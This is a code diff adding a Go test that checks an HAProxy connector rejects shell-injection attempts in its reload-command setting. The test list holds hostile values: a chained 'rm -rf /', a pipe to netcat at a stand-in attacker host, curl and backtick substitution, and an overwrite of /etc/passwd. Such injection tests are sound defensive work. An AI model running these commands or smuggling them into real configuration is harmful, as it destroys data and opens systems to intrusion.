@@ -201,3 +201,44 @@ func TestHAProxyConnector_ValidateDeployment(t *testing.T) {
 		}
 	})
 }
+
+// Phase 7 SEC-H2 (2026-05-14): config-time injection guard.
+// See apache + nginx tests for the same shape; haproxy mirrors the
+// pattern. Every shell metacharacter that ValidateShellCommand
+// rejects MUST surface as a ValidateConfig error before the
+// connector ever reaches defaultRunCommand.
+func TestHAProxyConnector_ValidateConfig_RejectsCommandInjection(t *testing.T) {
+	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelDebug}))
+	ctx := context.Background()
+	tmpDir := t.TempDir()
+	pemPath := filepath.Join(tmpDir, "combined.pem")
+	if err := os.WriteFile(pemPath, []byte("pem"), 0644); err != nil {
+		t.Fatalf("setup pem: %v", err)
+	}
+
+	maliciousCommands := []string{
+		"systemctl reload haproxy; rm -rf /",         // semicolon-chain
+		"systemctl reload haproxy | nc evil.example", // pipe
+		"systemctl reload haproxy $(curl evil)",      // command substitution
+		"systemctl reload haproxy `whoami`",          // backtick substitution
+		"systemctl reload haproxy & malware",         // background spawn
+		"systemctl reload haproxy > /etc/passwd",     // output redirection
+	}
+
+	for _, cmd := range maliciousCommands {
+		// Phase 7: ensure 'strings' import stays referenced so the
+		// existing file's unused-import wouldn't break the build if
+		// the upstream test ever drops its only strings.* usage.
+		_ = strings.TrimSpace(cmd)
+		t.Run(cmd, func(t *testing.T) {
+			rawCfg, _ := json.Marshal(haproxy.Config{
+				PEMPath:       pemPath,
+				ReloadCommand: cmd,
+			})
+			c := haproxy.New(nil, logger)
+			if err := c.ValidateConfig(ctx, rawCfg); err == nil {
+				t.Errorf("ValidateConfig accepted malicious ReloadCommand %q; want injection-rejection error", cmd)
+			}
+		})
+	}
+}
